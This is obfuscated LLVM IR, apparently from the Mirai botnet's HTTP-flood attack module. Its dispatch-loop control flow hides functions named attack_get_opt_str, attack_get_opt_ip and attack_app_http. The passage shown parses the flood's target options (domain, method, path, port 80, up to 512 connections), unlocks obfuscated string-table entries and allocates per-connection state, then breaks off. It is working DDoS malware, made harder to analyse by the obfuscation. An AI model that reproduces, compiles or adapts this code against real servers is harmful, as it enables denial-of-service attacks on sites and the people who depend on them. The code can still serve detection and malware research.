  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 181577178, i32 1180391123
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 1180391123, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 908262060, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 1582055655, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 428853865, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1666552902, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1666552902, label %11
    i32 -2085219713, label %17
    i32 1420185014, label %29
    i32 1615993836, label %36
    i32 -844615094, label %37
    i32 -1691550732, label %40
    i32 280159904, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 -2085219713, i32 -1691550732
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 1420185014, i32 1615993836
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 280159904, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 -844615094, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 1666552902, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 280159904, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 968878795, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 968878795, label %first
    i32 135219266, label %18
    i32 1877703850, label %20
    i32 -849736956, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 135219266, i32 1877703850
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -849736956, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 -849736956, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1688833076, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1688833076, label %first
    i32 2105910508, label %18
    i32 -1760006198, label %20
    i32 1151381894, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 2105910508, i32 -1760006198
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 1151381894, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 1151381894, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem10 = alloca i32
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  store i8* %84, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 999628669, i32* %switchVar
  %.reg2mem17 = alloca i1
  %.reg2mem19 = alloca i1
  %.reg2mem21 = alloca i1
  %.reg2mem23 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar9 = load i32, i32* %switchVar
  switch i32 %switchVar9, label %switchDefault [
    i32 999628669, label %first
    i32 -1515078464, label %87
    i32 -1434540947, label %91
    i32 338481360, label %92
    i32 755945596, label %97
    i32 -125472980, label %98
    i32 -1315495413, label %103
    i32 875387769, label %104
    i32 -953342871, label %109
    i32 -1198354173, label %110
    i32 -229490099, label %111
    i32 875545300, label %117
    i32 476432916, label %126
    i32 -76810520, label %135
    i32 1401285199, label %144
    i32 -4772468, label %145
    i32 -2044087240, label %148
    i32 -1812341988, label %152
    i32 716390048, label %153
    i32 1374903555, label %158
    i32 -1824760479, label %163
    i32 -1466966896, label %206
    i32 -1893131949, label %234
    i32 285700029, label %271
    i32 -1826854186, label %301
    i32 1419489459, label %NodeBlock7
    i32 1784243764, label %NodeBlock5
    i32 -1072684276, label %NodeBlock3
    i32 -810902112, label %LeafBlock1
    i32 -1929668605, label %NodeBlock
    i32 -1287013769, label %LeafBlock
    i32 1133628317, label %310
    i32 -1785738241, label %319
    i32 -1708280499, label %328
    i32 -166429748, label %337
    i32 -440448056, label %346
    i32 956623711, label %NewDefault
    i32 1240972321, label %355
    i32 -1814801327, label %364
    i32 -24225225, label %367
    i32 127342235, label %368
    i32 1614646283, label %371
    i32 1966028553, label %380
    i32 493471845, label %381
    i32 -1401533593, label %390
    i32 -1089897759, label %391
    i32 1572601886, label %396
    i32 -811149537, label %407
    i32 -746486378, label %413
    i32 -813063586, label %416
    i32 -2009967126, label %419
    i32 609313212, label %420
    i32 -1104362461, label %427
    i32 1876311885, label %434
    i32 -77874010, label %439
    i32 -547188382, label %445
    i32 -48285682, label %446
    i32 -1373722447, label %504
    i32 -470757365, label %509
    i32 1696927156, label %510
    i32 -749407995, label %517
    i32 -1271129881, label %525
    i32 -958719833, label %534
    i32 279785421, label %556
    i32 -1456737321, label %561
    i32 1610600802, label %562
    i32 1673182456, label %569
    i32 -1510165495, label %682
    i32 -1535967888, label %723
    i32 -750015066, label %729
    i32 1733086231, label %736
    i32 551569588, label %743
    i32 -814796087, label %762
    i32 1163390953, label %765
    i32 1127770028, label %772
    i32 29923081, label %782
    i32 1522317737, label %790
    i32 -1515895643, label %800
    i32 1154521900, label %808
    i32 638304019, label %843
    i32 -1559604108, label %848
    i32 -660752780, label %849
    i32 942831174, label %856
    i32 -1482151838, label %878
    i32 1650658452, label %883
    i32 423481053, label %884
    i32 -946473153, label %891
    i32 -1042773173, label %913
    i32 1083948546, label %918
    i32 344892443, label %919
    i32 -1896435353, label %926
    i32 -2121689877, label %948
    i32 419477370, label %953
    i32 594717924, label %954
    i32 -149778853, label %961
    i32 1709547294, label %970
    i32 2143536667, label %979
    i32 -194975719, label %980
    i32 1972938174, label %981
    i32 -1981576125, label %982
    i32 -679179229, label %983
    i32 -1679670361, label %984
    i32 -1089755431, label %985
    i32 1203471678, label %986
    i32 -283384343, label %989
    i32 -229456216, label %993
    i32 1180214649, label %994
    i32 637829779, label %1004
    i32 -163500035, label %1005
    i32 -1512946799, label %1006
    i32 1744473883, label %1011
    i32 1013885723, label %1021
    i32 2049023066, label %1022
    i32 1871763204, label %1040
    i32 -1912608929, label %1049
    i32 948755891, label %1053
    i32 -2040816761, label %1056
    i32 488877835, label %1065
    i32 -157092710, label %1066
    i32 -1994555764, label %1084
    i32 108360560, label %1091
    i32 -1375021392, label %1101
    i32 1866007490, label %1110
    i32 364104155, label %1116
    i32 448186264, label %1120
    i32 -1710377805, label %1121
    i32 -846411053, label %1133
    i32 -1027532206, label %1136
    i32 898292782, label %1143
    i32 107098610, label %1146
    i32 507631937, label %1155
    i32 -1278064352, label %1167
    i32 1304773016, label %1170
    i32 -823287154, label %1182
    i32 1284478468, label %1189
    i32 163074014, label %1192
    i32 -1068453726, label %1205
    i32 1006167907, label %1208
    i32 -853679323, label %1209
    i32 1585637071, label %1210
    i32 -768309194, label %1219
    i32 903276030, label %1231
    i32 -123193842, label %1234
    i32 732711679, label %1246
    i32 95423078, label %1253
    i32 -1883955555, label %1256
    i32 -1097979833, label %1269
    i32 -1533065696, label %1272
    i32 -1381590006, label %1273
    i32 1456000232, label %1274
    i32 -1087453947, label %1281
    i32 1107588745, label %1293
    i32 -497300866, label %1296
    i32 16379822, label %1308
    i32 1663870826, label %1315
    i32 -280464080, label %1318
    i32 -601490464, label %1328
    i32 1179696455, label %1329
    i32 1807533966, label %1332
    i32 1709250680, label %1333
    i32 1248125187, label %1343
    i32 -139174004, label %1348
    i32 1809299807, label %1350
    i32 -1026509296, label %1367
    i32 631387193, label %1370
    i32 -41142005, label %1387
    i32 1409513339, label %1396
    i32 350318397, label %1399
    i32 -866308487, label %1415
    i32 1197129682, label %1430
    i32 1112828761, label %1438
    i32 -1801475068, label %1444
    i32 -1297128240, label %1453
    i32 320263495, label %1454
    i32 1928025049, label %1455
    i32 1260779495, label %1458
    i32 1379173004, label %1467
    i32 -925722100, label %1469
    i32 -1166130531, label %1476
    i32 -1223303963, label %1488
    i32 -734894585, label %1489
    i32 -1150534157, label %1490
    i32 204376179, label %1493
    i32 80710409, label %1497
    i32 -862626423, label %1502
    i32 1052973682, label %1517
    i32 -1469345324, label %1518
    i32 179251227, label %1519
    i32 -1062452684, label %1520
    i32 1362736826, label %1524
    i32 1970802667, label %1531
    i32 -335869158, label %1543
    i32 -1708895875, label %1546
    i32 -346069399, label %1558
    i32 1601159582, label %1565
    i32 -1749150384, label %1568
    i32 -249433302, label %1581
    i32 -1117298415, label %1588
    i32 1321132725, label %1591
    i32 -203107852, label %1601
    i32 -1469230745, label %1610
    i32 1488305383, label %1619
    i32 1846213522, label %1624
    i32 1195225023, label %1627
    i32 1989716219, label %1632
    i32 -1849013885, label %1637
    i32 143499530, label %1643
    i32 398471102, label %1652
    i32 -1389214695, label %1665
    i32 -2123881932, label %1676
    i32 2043610165, label %1677
    i32 126444145, label %1678
    i32 1856115160, label %1685
    i32 808037698, label %1698
    i32 -165127797, label %1707
    i32 1589336676, label %1718
    i32 -62087122, label %1719
    i32 -486286892, label %1720
    i32 707226982, label %1723
    i32 39250567, label %1724
    i32 -423770351, label %1731
    i32 -1235084871, label %1743
    i32 -2014504945, label %1746
    i32 1884461505, label %1758
    i32 2140881858, label %1765
    i32 -1259857942, label %1768
    i32 -118645065, label %1776
    i32 -1816027858, label %1785
    i32 -428736189, label %1794
    i32 -305712772, label %1802
    i32 -1386374493, label %1804
    i32 -1594205528, label %1807
    i32 -455953039, label %1816
    i32 1506782607, label %1831
    i32 -270344353, label %1834
    i32 162639720, label %1847
    i32 -157232052, label %1860
    i32 1771882494, label %1869
    i32 -1101738170, label %1888
    i32 89144342, label %1901
    i32 1851745042, label %1902
    i32 1936856554, label %1905
    i32 1714164431, label %1909
    i32 1271509497, label %1913
    i32 -1003512673, label %1920
    i32 1623243175, label %1922
    i32 1286429128, label %1924
    i32 -1552194864, label %1935
    i32 -1087113776, label %1942
    i32 -1494058248, label %1945
    i32 -9091542, label %1955
    i32 -2005989595, label %1964
    i32 1738327871, label %1973
    i32 -1939176896, label %1978
    i32 -1527630237, label %1981
    i32 -2127132432, label %1986
    i32 -400070254, label %1991
    i32 -546144740, label %1997
    i32 888214841, label %2006
    i32 1014645307, label %2019
    i32 658473256, label %2030
    i32 1438363531, label %2031
    i32 -886024123, label %2032
    i32 -33403100, label %2039
    i32 -3557371, label %2048
    i32 -249106234, label %2061
    i32 2068864309, label %2072
    i32 -893275886, label %2073
    i32 660158033, label %2074
    i32 1187232923, label %2075
    i32 -2042162733, label %2082
    i32 1871134625, label %2083
    i32 559412456, label %2084
    i32 -884290316, label %2095
    i32 -1254405374, label %2103
    i32 693339751, label %2106
    i32 1473934761, label %2111
    i32 -922684584, label %2114
    i32 -1871992277, label %2117
    i32 -1124523126, label %2118
    i32 1981760368, label %2127
    i32 1542599766, label %2134
    i32 -132963115, label %2135
    i32 -1021265117, label %2142
    i32 -436323434, label %2143
    i32 659835140, label %2149
    i32 -1983494389, label %2161
    i32 -739514643, label %2184
    i32 -1327747350, label %2186
    i32 -304810401, label %2190
    i32 -142802477, label %2195
    i32 -1495973729, label %2200
    i32 -153741911, label %2209
    i32 -1006268956, label %2210
    i32 739963328, label %2219
    i32 -65716374, label %2225
    i32 1472380554, label %2234
    i32 833540524, label %2238
    i32 227385679, label %2242
    i32 -1383014660, label %2253
    i32 -1448369368, label %2264
    i32 897886336, label %2297
    i32 1238277918, label %2306
    i32 1193141542, label %2393
    i32 -1884251892, label %2398
    i32 -111800272, label %2399
    i32 -546231447, label %2400
    i32 26781273, label %2406
    i32 455646465, label %2412
    i32 -1143746132, label %2422
    i32 260147410, label %2443
    i32 -751448009, label %2453
    i32 781674776, label %2461
    i32 1479475300, label %2464
    i32 -8407909, label %2470
    i32 568960918, label %2471
    i32 -1766343306, label %2484
    i32 -2067902709, label %2487
    i32 1270638796, label %2488
    i32 921885251, label %2489
    i32 -1312954682, label %2493
    i32 2034698763, label %2494
    i32 -684955448, label %2525
    i32 1264442075, label %2526
    i32 -643206501, label %2527
    i32 -477070303, label %2528
    i32 -549469125, label %2529
    i32 480683986, label %2530
    i32 -943957030, label %2537
    i32 -1134674473, label %2538
    i32 1299455729, label %2549
    i32 -887891528, label %2551
    i32 -1732789274, label %2555
    i32 -359631614, label %2560
    i32 -1282443947, label %2565
    i32 1595203210, label %2574
    i32 -45456984, label %2575
    i32 708117209, label %2576
    i32 -1013195260, label %2583
    i32 -327810222, label %2586
    i32 289328012, label %2587
    i32 -1639232257, label %2588
    i32 977541859, label %2589
    i32 -1140609847, label %2590
    i32 -1530442444, label %2591
    i32 -93813881, label %2594
    i32 -1943050054, label %2595
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %85 = icmp eq i8* %.reload, null
  %86 = select i1 %85, i32 -1434540947, i32 -1515078464
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %17, align 8
  %89 = icmp eq i8* %88, null
  %90 = select i1 %89, i32 -1434540947, i32 338481360
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1943050054, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8*, i8** %17, align 8
  %94 = call i32 @util_strlen(i8* %93)
  %95 = icmp sgt i32 %94, 255
  %96 = select i1 %95, i32 755945596, i32 -125472980
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 -1943050054, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8*, i8** %16, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = icmp sgt i32 %100, 127
  %102 = select i1 %101, i32 -1315495413, i32 875387769
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 -1943050054, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8*, i8** %15, align 8
  %106 = call i32 @util_strlen(i8* %105)
  %107 = icmp sgt i32 %106, 9
  %108 = select i1 %107, i32 -953342871, i32 -1198354173
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -1943050054, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -229490099, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %10, align 4
  %113 = load i8*, i8** %15, align 8
  %114 = call i32 @util_strlen(i8* %113)
  %115 = icmp slt i32 %112, %114
  %116 = select i1 %115, i32 875545300, i32 -2044087240
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %15, align 8
  %119 = load i32, i32* %10, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = icmp sge i32 %123, 97
  %125 = select i1 %124, i32 476432916, i32 1401285199
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %15, align 8
  %128 = load i32, i32* %10, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp sle i32 %132, 122
  %134 = select i1 %133, i32 -76810520, i32 1401285199
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8*, i8** %15, align 8
  %137 = load i32, i32* %10, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = sub nsw i32 %141, 32
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %139, align 1
  store i32 1401285199, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 -4772468, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %10, align 4
  store i32 -229490099, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %18, align 4
  %150 = icmp sgt i32 %149, 512
  %151 = select i1 %150, i32 -1812341988, i32 716390048
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 512, i32* %18, align 4
  store i32 716390048, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = call noalias i8* @calloc(i64 %155, i64 3140) #6
  %157 = bitcast i8* %156 to %struct.attack_http_state*
  store %struct.attack_http_state* %157, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  store i32 1374903555, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %9, align 4
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %159, %160
  %162 = select i1 %161, i32 -1824760479, i32 -24225225
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 1
  store i8 0, i8* %168, align 4
  %169 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %172, i32 0, i32 0
  store i32 -1, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %175 = load i32, i32* %9, align 4
